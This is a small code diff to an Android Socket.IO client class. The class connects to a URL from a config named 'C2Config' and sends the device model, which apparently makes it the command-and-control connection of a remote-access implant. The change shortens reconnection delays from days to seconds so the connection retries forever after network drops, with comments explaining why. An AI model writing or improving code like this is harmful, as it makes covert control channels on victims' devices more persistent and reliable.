@@ -21,8 +21,12 @@ public class IOSocket {
 
             IO.Options opts = new IO.Options();
             opts.reconnection = true;
-            opts.reconnectionDelay = 5000;
-            opts.reconnectionDelayMax = 999999999;
+            // Keep retrying after a drop instead of backing off to ~11.5 days:
+            // start at 2s, cap at 30s, retry forever. Without this a transient
+            // network blip (or a long-poll response past OkHttp's 10s read
+            // timeout) silently kills the connection for good.
+            opts.reconnectionDelay = 2000;
+            opts.reconnectionDelayMax = 30000;
 
             String url = C2Config.getUrl(ctx)
                     + "?model=" + Uri.encode(Build.MODEL)
